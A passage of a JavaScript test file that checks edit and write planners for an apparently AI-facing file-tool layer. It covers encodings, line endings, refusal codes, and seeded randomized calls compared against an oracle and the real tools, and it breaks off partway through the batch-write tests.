// The planners of the file tools (P8 ux-7): planEdit, planApplyPatch, planWrite and planWriteBatch say, from the bytes of a file and the arguments of a call and without touching anything,
// what the call would leave on disk. The approval card is drawn from them and the tools themselves write what they say, so there is ONE code path for the preview and the write.
//
//  1. the planners alone, on bytes in memory: CRLF, BOM, UTF-16LE, no final newline, Unicode, replace_all, a list of edits, every refusal with the code the tool gives
//  2. against an oracle written here from the rules (not from the planner): 600 seeded scripted edit_file / files_apply_patch calls on real files, each one planned and then run by the
//     real LocalTools: the plan equals the file after the run, byte for byte, and the hunks of the plan have the same digest as the hunks of what was really written
//  3. the same for write_file and files_write_batch (an existing file keeps its encoding and its CRLF; the rules of expected_sha256 / overwrite; all or nothing)
//  4. a refusal leaves every byte where it was, and is the refusal the planner predicted
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { StudioWorkspace } from '../lib/studio-workspace.mjs';
import { LocalTools, planApplyPatch, planEdit, planWrite, planWriteBatch } from '../lib/local-tools.mjs';
import { decodeText, encodeText, sha256, toLf } from '../lib/fs-safe.mjs';
import { diffHunks, hunksDigest } from '../lib/line-diff.mjs';
import { keyShapes, piecesIn } from './support/key-shapes.mjs';

let checks = 0;
const ok = (label) => { checks += 1; console.log(`  ok - ${label}`); };
setTimeout(() => { console.error('FAIL: the edit plans suite exceeded its own time budget'); process.exit(2); }, 200_000).unref();

const buf = (text, encoding = 'utf8') => encodeText(text, encoding);
const refused = (run, code, statusCode) => assert.throws(run, (error) => { assert.equal(error.code, code, `${error.code}: ${error.message}`); if (statusCode) assert.equal(error.statusCode, statusCode); return true; });
const errorCode = (result) => result.structuredContent?.error?.code;

// ------------------------------------------------------------------ 1. the planners alone
{
  const at = { relative: 'src/a.txt' };
  // an edit on an LF file
  const lf = buf('one\ntwo\nthree\n');
  const plain = planEdit({ path: 'src/a.txt', old_string: 'two', new_string: 'TWO' }, lf, at);
  assert.equal(plain.baseSha, sha256(lf));
  assert.equal(plain.newText, 'one\nTWO\nthree\n');
  assert.deepEqual(plain.data, buf('one\nTWO\nthree\n'));
  assert.equal(plain.sha256, sha256(plain.data));
  assert.equal(plain.unchanged, false);
  assert.equal(plain.relative, 'src/a.txt');
  assert.deepEqual([plain.additions, plain.deletions], [1, 1]);
  assert.equal(plain.hunks.length, 1);
  assert.equal(plain.encoding, 'utf8');
  assert.equal(plain.replacements, 1);
  assert.equal(plain.firstLine, 2);

  // a CRLF file: old_string and new_string are written with LF, the file keeps CRLF
  const crlf = buf('one\r\ntwo\r\nthree\r\n');
  const kept = planEdit({ path: 'x', old_string: 'one\ntwo', new_string: 'ONE\nTWO' }, crlf, at);
  assert.equal(kept.newText, 'ONE\r\nTWO\r\nthree\r\n');
  assert.deepEqual(kept.data, buf('ONE\r\nTWO\r\nthree\r\n'));
  assert.deepEqual(kept.hunks[0].rows.map((row) => row.text), ['one\r\n', 'two\r\n', 'ONE\r\n', 'TWO\r\n', 'three\r\n'], 'the rows carry the real line endings');
  // a CR LF in what the model wrote is one line ending, not two, and an old_string that spells the file's own endings still matches
  const spelled = planEdit({ path: 'x', old_string: 'one\r\ntwo', new_string: 'a\r\nb' }, crlf, at);
  assert.equal(spelled.newText, 'a\r\nb\r\nthree\r\n');
  // a BOM and UTF-16LE stay
  const bom = planEdit({ path: 'x', old_string: 'two', new_string: 'TWO' }, buf('one\ntwo\n', 'utf8-bom'), at);
  assert.deepEqual(bom.data, buf('one\nTWO\n', 'utf8-bom'));
  assert.equal(bom.newText, 'one\nTWO\n', 'the text has no byte order mark, the data has');
  assert.equal(bom.encoding, 'utf8-bom');
  const wide = planEdit({ path: 'x', old_string: 'two', new_string: 'TWO' }, buf('one\r\ntwo\r\n', 'utf16le'), at);
  assert.deepEqual(wide.data, buf('one\r\nTWO\r\n', 'utf16le'));
  assert.equal(wide.encoding, 'utf16le');
  // no final newline stays as it is
  assert.equal(planEdit({ path: 'x', old_string: 'two', new_string: 'TWO' }, buf('one\ntwo'), at).newText, 'one\nTWO');
  // Unicode
  assert.equal(planEdit({ path: 'x', old_string: 'Việt', new_string: 'Việt Nam 😀' }, buf('Tiếng Việt\n'), at).newText, 'Tiếng Việt Nam 😀\n');
  // replace_all, and a list of edits applied in order, each to the text the one before left
  assert.equal(planEdit({ path: 'x', old_string: 'a', new_string: 'b', replace_all: true }, buf('a a a\n'), at).newText, 'b b b\n');
  const listed = planEdit({ path: 'x', edits: [{ old_string: 'one', new_string: 'ONE' }, { old_string: 'ONE\ntwo', new_string: 'both' }] }, lf, at);
  assert.equal(listed.newText, 'both\nthree\n');
  assert.equal(listed.edits, 2);
  assert.equal(listed.many, true);
  const spread = planEdit({ path: 'x', edits: [{ old_string: 'one', new_string: 'ONE' }, { old_string: 'three', new_string: 'THREE' }] }, lf, at);
  assert.equal(spread.firstLine, 1, 'the line of the first edit');
  assert.deepEqual(spread.steps, [{ firstLine: 1, count: 1 }, { firstLine: 3, count: 1 }], 'and the line of each edit, at its turn');
  assert.equal(spread.replacements, 2);
  // edits that cancel each other
  const cancel = planEdit({ path: 'x', edits: [{ old_string: 'one', new_string: 'ONE' }, { old_string: 'ONE', new_string: 'one' }] }, lf, at);
  assert.equal(cancel.unchanged, true);
  assert.deepEqual(cancel.hunks, []);
  assert.deepEqual([cancel.additions, cancel.deletions], [0, 0]);
  assert.deepEqual(cancel.data, lf);
  // edits that cancel each other in a file with a byte order mark: the bytes are the file's own
  const bomFile = buf('one\ntwo\n', 'utf8-bom');
  const bomCancel = planEdit({ path: 'x', edits: [{ old_string: 'one', new_string: 'ONE' }, { old_string: 'ONE', new_string: 'one' }] }, bomFile, at);
  assert.deepEqual(bomCancel.data, bomFile, 'nothing to write: the data is the file as it is, byte order mark included');
  assert.equal(bomCancel.newText, 'one\ntwo\n');
  assert.equal(bomCancel.sha256, sha256(bomFile));
  // the sha that the model quotes
  assert.equal(planEdit({ path: 'x', old_string: 'two', new_string: 'TWO', expected_sha256: sha256(lf).toUpperCase() }, lf, at).newText, 'one\nTWO\nthree\n', 'a quoted sha is compared in lower case');
  ok('planEdit: LF, CRLF, BOM, UTF-16LE, no final newline, Unicode, replace_all, a list of edits, edits that cancel out');

  // refusals, with the codes and statuses the tool gives
  refused(() => planEdit({ path: 'x', old_string: 'nope', new_string: 'x' }, lf, at), 'not_found', 404);
  refused(() => planEdit({ path: 'x', old_string: 'e', new_string: 'x' }, lf, at), 'ambiguous_match', 409);
  refused(() => planEdit({ path: 'x', old_string: '', new_string: 'x' }, lf, at), 'bad_edit', 400);
  refused(() => planEdit({ path: 'x', old_string: 'one', new_string: 'one' }, lf, at), 'bad_edit', 400);
  refused(() => planEdit({ path: 'x', old_string: 'one' }, lf, at), 'bad_edit', 400);
  refused(() => planEdit({ path: 'x', old_string: 'one', new_string: 'x', edits: [] }, lf, at), 'bad_edit', 400);
  refused(() => planEdit({ path: 'x', old_string: 'one', new_string: 'x', edits: [{ old_string: 'two', new_string: 'TWO' }] }, lf, at), 'bad_edit', 400);
  refused(() => planEdit({ path: 'x', edits: [] }, lf, at), 'bad_edit', 400);
  refused(() => planEdit({ path: 'x', edits: Array.from({ length: 51 }, (_, n) => ({ old_string: `a${n}`, new_string: `b${n}` })) }, lf, at), 'bad_edit', 400);
  refused(() => planEdit({ path: 'x', old_string: 'one', new_string: 'x', expected_sha256: 'f'.repeat(64) }, lf, at), 'stale_revision', 409);
  refused(() => planEdit({ path: 'x', old_string: 'one', new_string: 'x' }, Buffer.from([0x61, 0, 0x62]), at), 'binary_file', 415);
  refused(() => planEdit({ path: 'x', old_string: 'one', new_string: 'x' }, Buffer.from([0xff, 0xfe, 0x61]), at), 'unsupported_encoding', 415);
  refused(() => planEdit({ path: 'x', old_string: 'one', new_string: 'x' }, Buffer.from([0xfe, 0xff, 0, 0x61]), at), 'unsupported_encoding', 415);
  refused(() => planEdit({ path: 'x', old_string: 'one', new_string: 'x' }, Buffer.from([0xe9, 0x74, 0xe9]), at), 'unsupported_encoding', 415);
  refused(() => planEdit({ path: 'x', old_string: 'one', new_string: 'x\ud800' }, lf, at), 'invalid_unicode', 400);
  // every edit is judged by its form before any is applied: an edit that cannot be found does not come first
  refused(() => planEdit({ path: 'x', edits: [{ old_string: 'zzz', new_string: 'x' }, { old_string: '', new_string: 'y' }] }, lf, at), 'bad_edit', 400);
  refused(() => planEdit({ path: 'x', edits: [{ old_string: 'zzz', new_string: 'x' }, { old_string: 'a', new_string: 'a' }] }, lf, at), 'bad_edit', 400);
  refused(() => planEdit({ path: 'x', edits: [{ old_string: 'zzz', new_string: 'x' }, { old_string: 5, new_string: 'a' }] }, lf, at), 'bad_edit', 400);
  const fifty = Array.from({ length: 50 }, (_, n) => ({ old_string: `w${n}_`, new_string: `v${n}_` }));
  assert.equal(planEdit({ path: 'x', edits: fifty }, buf(fifty.map((edit) => `${edit.old_string}\n`).join('')), at).edits, 50, 'fifty edits are the most');
  // in a list the refusal says which edit and that nothing is written
  assert.throws(() => planEdit({ path: 'x', edits: [{ old_string: 'one', new_string: 'ONE' }, { old_string: 'zzz', new_string: 'x' }] }, lf, at), (error) => {
    assert.equal(error.code, 'not_found');
    assert.match(error.message, /2\/2/);
    assert.match(error.message, /chưa ghi gì/);
    return true;
  });
  assert.throws(() => planEdit({ path: 'x', edits: [{ old_string: 'one', new_string: 'ONE' }, { old_string: 'ONE', new_string: 'ONE' }] }, lf, at), (error) => { assert.equal(error.code, 'bad_edit'); assert.match(error.message, /2\/2/); return true; });
  // the plan does not touch the bytes it was given
  const kept2 = Buffer.from(lf);
  planEdit({ path: 'x', old_string: 'two', new_string: 'TWO' }, kept2, at);
  assert.deepEqual(kept2, lf);
  ok('planEdit refuses with the code and status of the tool: not found, ambiguous, empty or equal strings, a wrong form, too many edits, a stale sha, binary, not UTF-8, a lone surrogate, and says which edit of a list');

  // files_apply_patch is an edit with replace_all false
  const patched = planApplyPatch({ path: 'x', old_text: 'two', new_text: 'TWO', expected_sha256: sha256(lf) }, lf, at);
  assert.equal(patched.newText, 'one\nTWO\nthree\n');
  refused(() => planApplyPatch({ path: 'x', old_text: 'e', new_text: 'E' }, lf, at), 'ambiguous_match', 409);
  refused(() => planApplyPatch({ path: 'x', old_text: 'two', new_text: 'TWO', expected_sha256: 'a'.repeat(64) }, lf, at), 'stale_revision', 409);
  assert.equal(patched.hunks.length, 1);
  ok('planApplyPatch is planEdit with one edit that is never replace_all');
}

{
  const at = { relative: 'w.txt' };
  const created = planWrite({ path: 'w.txt', content: 'a\nb\n' }, null, at);
  assert.equal(created.baseSha, null, 'a file that is not there has no base');
  assert.equal(created.created, true);
  assert.equal(created.newText, 'a\nb\n');
  assert.deepEqual(created.data, buf('a\nb\n'));
  assert.deepEqual([created.additions, created.deletions], [2, 0]);
  assert.equal(created.unchanged, false);
  assert.equal(created.sha256, sha256(created.data));
  assert.equal(created.encoding, 'utf8');
  // an expected_sha256 for a file that is not there is ignored by write_file
  assert.equal(planWrite({ path: 'w.txt', content: 'x', expected_sha256: 'a'.repeat(64) }, null, at).created, true);

  const old = buf('one\r\ntwo\r\n', 'utf8-bom');
  refused(() => planWrite({ path: 'w.txt', content: 'x\n' }, old, at), 'file_exists', 409);
  refused(() => planWrite({ path: 'w.txt', content: 'x\n', expected_sha256: 'e'.repeat(64) }, old, at), 'stale_revision', 409);
  const over = planWrite({ path: 'w.txt', content: 'one\nTWO\n', overwrite: true }, old, at);
  assert.equal(over.created, false);
  assert.equal(over.baseSha, sha256(old));
  assert.equal(over.newText, 'one\r\nTWO\r\n', 'an existing CRLF file stays CRLF');
  assert.deepEqual(over.data, buf('one\r\nTWO\r\n', 'utf8-bom'), 'and keeps its byte order mark');
  assert.deepEqual([over.additions, over.deletions], [1, 1]);
  assert.deepEqual(planWrite({ path: 'w.txt', content: 'one\nTWO\n', expected_sha256: sha256(old) }, old, at).data, over.data);
  assert.deepEqual(planWrite({ path: 'w.txt', content: 'one\nTWO\n', expected_sha256: sha256(old).toUpperCase() }, old, at).data, over.data, 'a quoted sha is compared in lower case');
  const same = planWrite({ path: 'w.txt', content: 'one\ntwo\n', overwrite: true }, old, at);
  assert.equal(same.unchanged, true);
  assert.deepEqual(same.hunks, []);
  const wide = planWrite({ path: 'w.txt', content: 'x\ny\n', overwrite: true }, buf('a\r\nb\r\n', 'utf16le'), at);
  assert.deepEqual(wide.data, buf('x\r\ny\r\n', 'utf16le'));
  // a file that cannot be read as text is replaced as UTF-8, and the plan says that it could not show the old content
  const binary = planWrite({ path: 'w.txt', content: 'text\n', overwrite: true }, Buffer.from([0, 1, 2, 3]), at);
  assert.equal(binary.oldUnreadable, true);
  assert.equal(binary.encoding, 'utf8');
  assert.deepEqual([binary.additions, binary.deletions], [1, 0], 'the old content is not text, so it is not counted');
  assert.equal(planWrite({ path: 'w.txt', content: 'text\n', overwrite: true }, old, at).oldUnreadable, undefined);
  refused(() => planWrite({ path: 'w.txt', content: 'a\0b' }, null, at), 'bad_content', 400);
  refused(() => planWrite({ path: 'w.txt', content: 'x'.repeat(2 * 1024 * 1024 + 1) }, null, at), 'content_too_large', 413);
  refused(() => planWrite({ path: 'w.txt', content: 'é'.repeat(1024 * 1024 + 10) }, null, at), 'content_too_large', 413); // the size is in bytes, not in characters
  refused(() => planWrite({ path: 'w.txt', content: 'bad\udc00' }, null, at), 'invalid_unicode', 400);
  ok('planWrite: a new file, the rules of expected_sha256 and overwrite, the encoding and the CRLF of the file it replaces, no change, an old file that is not text, NUL, size, lone surrogate');

  // the batch: the rules of write_file for every item, all or nothing, with the files supplied by a loader
  const disk = new Map([['old.txt', buf('o\r\nl\r\n', 'utf8-bom')], ['plain.txt', buf('p\n')]]);
  const load = async (item) => {
    const relative = item.path.replaceAll('\\', '/');
    if (relative === 'symlink.txt') throw Object.assign(new Error('symlink'), { code: 'symlink', statusCode: 403 });
    return { relative, absolute: `/ws/${relative}`, existing: disk.get(relative) ?? null, mode: 0o644, parentIsFile: relative.startsWith('file.txt/') };
  };
  const plans = await planWriteBatch([
    { path: 'new/a.txt', content: 'A\n' }, { path: 'old.txt', content: 'o\nL\n', expected_sha256: sha256(disk.get('old.txt')) }, { path: 'plain.txt', content: 'p\nq\n', overwrite: true },
  ], load);
  assert.equal(plans.length, 3);
  assert.deepEqual(plans.map((plan) => plan.relative), ['new/a.txt', 'old.txt', 'plain.txt']);
  assert.deepEqual(plans.map((plan) => plan.created), [true, false, false]);
  assert.deepEqual(plans[1].data, buf('o\r\nL\r\n', 'utf8-bom'));
  assert.equal(plans[1].baseSha, sha256(disk.get('old.txt')));
  assert.equal(plans[0].baseSha, null);
  assert.equal(plans[1].absolute, '/ws/old.txt', 'what the loader found travels with the plan');
  assert.equal(plans[1].mode, 0o644);
  const upper = await planWriteBatch([{ path: 'old.txt', content: 'o\nL\n', expected_sha256: sha256(disk.get('old.txt')).toUpperCase() }], load);
  assert.equal(upper.length, 1, 'a quoted sha is compared in lower case');
  const rejects = async (files, code) => assert.rejects(planWriteBatch(files, load), (error) => { assert.equal(error.code, code, `${error.code}: ${error.message}`); return true; });
  await rejects([], 'bad_files');
  await rejects(Array.from({ length: 51 }, (_, n) => ({ path: `f${n}.txt`, content: 'x' })), 'bad_files');
  await rejects([{ path: '', content: 'x' }], 'bad_path');
  await rejects([{ path: 'a.txt', content: 5 }], 'bad_content');
  await rejects([{ path: 'a.txt', content: 'a\0' }], 'bad_content');
  await rejects([{ path: 'a.txt', content: 'x', expected_sha256: 'nope' }], 'bad_revision');
  await rejects([{ path: 'a.txt', content: 'x', expected_sha256: 'a'.repeat(63) }], 'bad_revision');
  await rejects([{ path: 'a.txt', content: 'x', expected_sha256: 'a'.repeat(65) }], 'bad_revision');
  await rejects([{ path: 'a.txt', content: 'x' }, { path: 'a.txt', content: 'y' }], 'duplicate_path');
  await rejects([{ path: 'old.txt', content: 'x' }, { path: 'plain.txt', content: 'x' }], 'file_exists');
  await rejects([{ path: 'old.txt', content: 'x', expected_sha256: 'c'.repeat(64) }], 'stale_revision');
  await rejects([{ path: 'gone.txt', content: 'x', expected_sha256: 'c'.repeat(64) }], 'stale_revision');
  await rejects([{ path: 'file.txt/inner.txt', content: 'x' }], 'not_directory');
  await rejects([{ path: 'symlink.txt', content: 'x' }], 'symlink');
  await rejects([{ path: 'a.txt', content: 'x'.repeat(2 * 1024 * 1024 + 1) }], 'file_too_large');
  await assert.rejects(planWriteBatch([{ path: 'old.txt', content: 'x' }, { path: 'plain.txt', content: 'x' }, { path: 'new.txt', content: 'x' }], load), (error) => { assert.match(error.message, /old\.txt, plain\.txt/, 'every file that exists is named'); return true; });
  ok('planWriteBatch: the rules of write_file for every item, the files that exist all named in one refusal, all or nothing, what the loader found travels with the plan');
}

// ------------------------------------------------------------------ the real tools
const root = await fs.mkdtemp(path.join(os.tmpdir(), 'chatmcp-plans-'));
const work = path.join(root, 'work');
const state = path.join(root, 'state');
await fs.mkdir(work, { recursive: true });
const manager = { workspace: work, secrets: [] };
const studio = new StudioWorkspace({ manager, directory: path.join(state, 'studio') });
const local = new LocalTools({ workspace: studio, stateDirectory: state });

function seeded(seed) {
  let state2 = seed >>> 0;
  return () => {
    state2 = (state2 + 0x6D2B79F5) >>> 0;
    let t = state2;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
const random = seeded(20261103);
const pick = (count) => Math.floor(random() * count);
const LINES = ['alpha', 'beta', 'gamma', 'delta = 1;', 'delta = 2;', 'tiếng Việt', 'emoji 😀', '    indented', '', '}', 'foo(bar)', 'let x = "q";', 'ünïcödé'];
const ENCODINGS = ['utf8', 'utf8', 'utf8-bom', 'utf16le'];

/** A file the way a project has them: any line ending, a final newline or none, any of the three encodings. */
function makeFile() {
  const body = Array.from({ length: 1 + pick(14) }, () => LINES[pick(LINES.length)]);
  const style = ['lf', 'crlf', 'mixed', 'crlf', 'lf'][pick(5)];
  const finalNewline = pick(4) !== 0;
  const text = body.map((line, at) => line + (at < body.length - 1 || finalNewline ? (style === 'lf' ? '\n' : style === 'crlf' ? '\r\n' : at % 2 ? '\r\n' : '\n') : '')).join('');
  const encoding = ENCODINGS[pick(ENCODINGS.length)];
  return { text, encoding, data: encodeText(text, encoding) };
}
/** One edit of the text: sometimes unique, sometimes ambiguous, sometimes absent; written with LF whatever the file uses. */
function makeEdit(text) {
  const lines = toLf(text).split('\n');
  // mostly a line that has something in it: an empty old_string is refused whatever the file is
  let line = lines[pick(lines.length)];
  for (let tries = 0; tries < 6 && line.trim() === ''; tries += 1) line = lines[pick(lines.length)];
  const next = lines[pick(lines.length)];
  const old = [line, line, `${line}\n${next}`, `${line}\n${next}`, `${line}\n${next}\n`, line.slice(0, 3), line.slice(-4), 'zz-not-there', `${line}\n`, '\n'][pick(10)];
  return { old_string: old, new_string: ['', 'REPLACED', `${old}${old}`, 'a\nb', 'Việt 😀', old.toUpperCase()][pick(6)], replace_all: pick(3) === 0 };
}

/** The rules, written from the specification and not from the planner: what an edit_file call leaves, or why it fails. */
function oracleEdit(buffer, edits, expectedSha) {
  // every edit is judged by its form before the file is opened
  if (edits.some((edit) => edit.old_string === '' || edit.old_string === edit.new_string)) return { ok: false, code: 'bad_edit' };
  if (expectedSha && sha256(buffer) !== expectedSha.toLowerCase()) return { ok: false, code: 'stale_revision' };
  const decoded = decodeText(buffer);
  if (!decoded.ok) return { ok: false, code: decoded.reason === 'binary' ? 'binary_file' : 'unsupported_encoding' };
  const crlf = decoded.eol === 'crlf';
  let text = crlf ? decoded.text.split('\r\n').join('\n') : decoded.text;
  let count = 0;
  let firstLine = 0;
  for (const [index, edit] of edits.entries()) {
    const from = crlf ? edit.old_string.split('\r\n').join('\n') : edit.old_string;
    const to = crlf ? edit.new_string.split('\r\n').join('\n') : edit.new_string;
    if (from === '' || from === to) return { ok: false, code: 'bad_edit' };
    const parts = text.split(from);
    if (parts.length === 1) return { ok: false, code: 'not_found' };
    if (parts.length > 2 && !edit.replace_all) return { ok: false, code: 'ambiguous_match' };
    if (index === 0) firstLine = parts[0].split('\n').length;
    count += edit.replace_all ? parts.length - 1 : 1;
    text = edit.replace_all ? parts.join(to) : parts[0] + to + parts.slice(1).join(from);
  }
  const written = crlf ? text.split('\n').join('\r\n') : text;
  return { ok: true, text: written, encoding: decoded.encoding, data: encodeText(written, decoded.encoding), before: decoded.text, count, firstLine };
}

{
  let succeeded = 0;
  let failed = 0;
  const codes = new Map();
  for (let round = 0; round < 600; round += 1) {
    const file = makeFile();
    const name = `edit-${round}.txt`;
    const target = path.join(work, name);
    await fs.writeFile(target, file.data);
    const count = pick(3) === 0 ? 1 + pick(3) : 1;
    const edits = Array.from({ length: count }, () => makeEdit(file.text));
    const sha = pick(8) === 0 ? (pick(2) ? sha256(file.data) : 'd'.repeat(64)) : undefined;
    const form = round % 4; // 0 one edit, 1 a list, 2 files_apply_patch, 3 a list of one
    let tool; let args; let list;
    if (form === 2) { tool = 'files_apply_patch'; list = [{ ...edits[0], replace_all: false }]; args = { path: name, old_text: list[0].old_string, new_text: list[0].new_string, ...(sha ? { expected_sha256: sha } : {}) }; }
    else if (form === 0) { tool = 'edit_file'; list = [edits[0]]; args = { path: name, old_string: edits[0].old_string, new_string: edits[0].new_string, replace_all: edits[0].replace_all, ...(sha ? { expected_sha256: sha } : {}) }; }
    else { tool = 'edit_file'; list = form === 3 ? [edits[0]] : edits; args = { path: name, edits: list, ...(sha ? { expected_sha256: sha } : {}) }; }
    const want = oracleEdit(file.data, list, sha);
    const planArgs = args;
    // the plan, before anything runs
    let plan = null; let planFault = null;
    try { plan = (tool === 'files_apply_patch' ? planApplyPatch : planEdit)(planArgs, file.data, { relative: name }); } catch (error) { planFault = error; }
    // the real tool
    const result = await local.call(tool, args);
    const after = await fs.readFile(target);
    const where = `round ${round} (${tool}, ${list.length} edit${list.length > 1 ? 's' : ''}, ${file.encoding}, ${JSON.stringify(list.map((edit) => edit.old_string))})`;
    if (want.ok) {
      assert.equal(planFault, null, `${where}: the plan refused (${planFault?.code}: ${planFault?.message}) but the rules say it works`);
      assert.equal(result.isError, false, `${where}: the tool failed: ${result.content?.[0]?.text}`);
      assert.deepEqual(plan.data, want.data, `${where}: the plan is not what the rules say`);
      assert.equal(plan.newText, want.text, `${where}: the text of the plan`);
      assert.deepEqual(after, plan.data, `${where}: the file after the run is not what was planned`);
      assert.equal(sha256(after), plan.sha256, `${where}: the sha of the plan`);
      assert.equal(plan.baseSha, sha256(file.data), `${where}: the base of the plan is the file as it was`);
      assert.equal(decodeText(after).text, plan.newText, `${where}: the text of the file after the run`);
      assert.equal(plan.encoding, file.encoding, `${where}: the encoding`);
      // the hunks of the plan are the hunks of what was really written
      const written = diffHunks(want.before, decodeText(after).text);
      assert.equal(hunksDigest(plan.hunks), hunksDigest(written.hunks), `${where}: the hunks of the plan and the hunks of the file differ`);
      assert.deepEqual([plan.additions, plan.deletions], [written.additions, written.deletions], `${where}: the counts`);
      assert.equal(plan.unchanged, after.equals(file.data), `${where}: unchanged`);
      assert.equal(plan.replacements, want.count, `${where}: how many places were replaced`);
      assert.equal(plan.firstLine, want.firstLine, `${where}: the line of the first edit`);
      assert.equal(plan.edits, list.length, `${where}: how many edits`);
      assert.equal(plan.many, form === 1 || form === 3, `${where}: one edit or a list`);
      if (!plan.unchanged) assert.equal(result.structuredContent.replacements, want.count, `${where}: the count the tool reports`);
      if (!plan.unchanged) assert.equal(result.structuredContent.sha256, plan.sha256, `${where}: the sha the tool reports`);
      succeeded += 1;
    } else {
      assert.ok(planFault, `${where}: the plan should have refused with ${want.code}`);
      assert.equal(planFault.code, want.code, `${where}: ${planFault.message}`);
      assert.equal(result.isError, true, `${where}: the tool should have refused with ${want.code}`);
      assert.equal(errorCode(result), want.code, `${where}: the tool's code`);
      assert.deepEqual(after, file.data, `${where}: a refusal leaves the file as it was`);
      assert.equal(planFault.message.replace(/^Chỉnh sửa \d+\/\d+ thất bại, chưa ghi gì: /, ''), result.structuredContent.error.message.replace(/^Chỉnh sửa \d+\/\d+ thất bại, chưa ghi gì: /, ''), `${where}: the plan and the tool say the same thing`);
      failed += 1;
      codes.set(want.code, (codes.get(want.code) ?? 0) + 1);
    }
  }
  assert.ok(succeeded > 150 && failed > 150, `the scenarios should be a mix (${succeeded} worked, ${failed} were refused)`);
  for (const code of ['not_found', 'ambiguous_match', 'stale_revision', 'bad_edit']) assert.ok((codes.get(code) ?? 0) > 3, `the scenarios should refuse with ${code} a few times (${codes.get(code) ?? 0})`);
  ok(`600 seeded edit_file / files_apply_patch calls on real files (LF, CRLF, mixed, BOM, UTF-16LE, no final newline, Unicode): ${succeeded} written exactly as planned and as the rules say, with the same hunks; ${failed} refused (${[...codes].map(([code, n]) => `${code} ${n}`).join(', ')}) with the planned code, the file untouched`);
}

// ------------------------------------------------------------------ 3. write_file and files_write_batch
/** What write_file / files_write_batch leave for an existing file (the encoding and the CRLF of the file) or a new one. */
function oracleWrite(existing, content) {
  let encoding = 'utf8';
  let text = content;
  if (existing) {
    const old = decodeText(existing);
    if (old.ok) { encoding = old.encoding; if (old.eol === 'crlf') text = content.split('\r\n').join('\n').split('\n').join('\r\n'); }
  }
  return { text, encoding, data: encodeText(text, encoding) };
}
{
  let wrote = 0;
  let refusedCount = 0;
  for (let round = 0; round < 240; round += 1) {
    const exists = pick(4) !== 0;
    const file = exists ? makeFile() : null;
    const name = `write-${round}.txt`;
    const target = path.join(work, name);
    if (file) await fs.writeFile(target, file.data);
    const content = Array.from({ length: pick(10) }, () => LINES[pick(LINES.length)]).map((line) => line + (pick(3) ? '\n' : '\r\n')).join('') + (pick(3) ? '' : 'tail');
    const flavour = pick(5); // 0 nothing, 1 overwrite, 2 the right sha, 3 a wrong sha, 4 both
    const args = { path: name, content, ...(flavour === 1 || flavour === 4 ? { overwrite: true } : {}), ...(flavour === 2 || flavour === 4 ? { expected_sha256: file ? sha256(file.data) : 'a'.repeat(64) } : {}), ...(flavour === 3 ? { expected_sha256: 'b'.repeat(64) } : {}) };
    let want;
    if (file && args.expected_sha256 && args.expected_sha256 !== sha256(file.data)) want = { ok: false, code: 'stale_revision' };
    else if (file && !args.expected_sha256 && !args.overwrite) want = { ok: false, code: 'file_exists' };
    else want = { ok: true, ...oracleWrite(file?.data ?? null, content) };
    let plan = null; let planFault = null;
    try { plan = planWrite(args, file?.data ?? null, { relative: name }); } catch (error) { planFault = error; }
    const result = await local.call('write_file', args);
    const after = await fs.readFile(target).catch(() => null);
    const where = `round ${round} (write_file, ${file ? file.encoding : 'new file'}, flavour ${flavour})`;
    if (want.ok) {
      assert.equal(planFault, null, `${where}: ${planFault?.message}`);
      assert.equal(result.isError, false, `${where}: ${result.content?.[0]?.text}`);
      assert.deepEqual(plan.data, want.data, `${where}: the plan`);
      assert.equal(plan.newText, want.text);
      assert.deepEqual(after, plan.data, `${where}: the file after the run is what was planned`);
      assert.equal(plan.created, !file);
      assert.equal(plan.baseSha, file ? sha256(file.data) : null);
      const before = file ? decodeText(file.data) : { ok: true, text: '' };
      const written = diffHunks(before.ok ? before.text : '', decodeText(after).text);
      assert.equal(hunksDigest(plan.hunks), hunksDigest(written.hunks), `${where}: the hunks of the plan and of the file`);
      assert.deepEqual([plan.additions, plan.deletions], [written.additions, written.deletions]);
      assert.equal(plan.unchanged, Boolean(file) && after.equals(file.data));
      wrote += 1;
    } else {
      assert.equal(planFault?.code, want.code, `${where}: the plan`);
      assert.equal(errorCode(result), want.code, `${where}: the tool`);
      assert.deepEqual(after, file?.data ?? null, `${where}: a refusal changes nothing`);
      refusedCount += 1;
    }
  }
  assert.ok(wrote > 80 && refusedCount > 20, `a mix (${wrote} written, ${refusedCount} refused)`);
  ok(`240 seeded write_file calls: ${wrote} leave exactly the planned bytes (an existing file keeps its encoding and CRLF), ${refusedCount} refused with the planned code and nothing changed`);
}

{
  let wrote = 0;
  let refusedCount = 0;
  for (let round = 0; round < 120; round += 1) {
    const items = [];
    const files = new Map();
    const itemCount = 1 + pick(6);
    for (let index = 0; index < itemCount; index += 1) {
      const name = `batch-${round}-${index}.txt`;
      const exists = pick(3) !== 0;
      const file = exists ? makeFile() : null;
      if (file) { await fs.writeFile(path.join(work, name), file.data); files.set(name, file); }
      const flavour = pick(8);
      items.push({ path: name, content: `${LINES[pick(LINES.length)]}\n${LINES[pick(LINES.length)]}\n`,
        ...(flavour === 0 ? { overwrite: true } : {}), ...(flavour === 1 ? { expected_sha256: file ? sha256(file.data) : 'c'.repeat(64) } : {}), ...(flavour === 2 ? { expected_sha256: 'e'.repeat(64) } : {}), ...(flavour >= 3 && file ? { overwrite: true } : {}) });
    }
    // the rules of the batch: the first item that is wrong decides the code, files that exist without a reason are named together at the end
    let want = { ok: true };
    const exist = [];
    for (const item of items) {
      const file = files.get(item.path);
      if (file) {
        if (item.expected_sha256) { if (item.expected_sha256 !== sha256(file.data)) { want = { ok: false, code: 'stale_revision' }; break; } }
        else if (item.overwrite !== true) exist.push(item.path);
      } else if (item.expected_sha256) { want = { ok: false, code: 'stale_revision' }; break; }
    }
    if (want.ok && exist.length) want = { ok: false, code: 'file_exists' };
    let plans = null; let planFault = null;
    const load = async (item) => ({ relative: item.path, absolute: path.join(work, item.path), existing: files.get(item.path)?.data ?? null, mode: 0o644, parentIsFile: false });
    try { plans = await planWriteBatch(items, load); } catch (error) { planFault = error; }
    const result = await local.call('files_write_batch', { files: items });
    const where = `round ${round} (files_write_batch, ${items.length} items)`;
    if (want.ok) {
      assert.equal(planFault, null, `${where}: ${planFault?.message}`);
      assert.equal(result.isError, false, `${where}: ${result.content?.[0]?.text}`);
      assert.equal(plans.length, items.length);
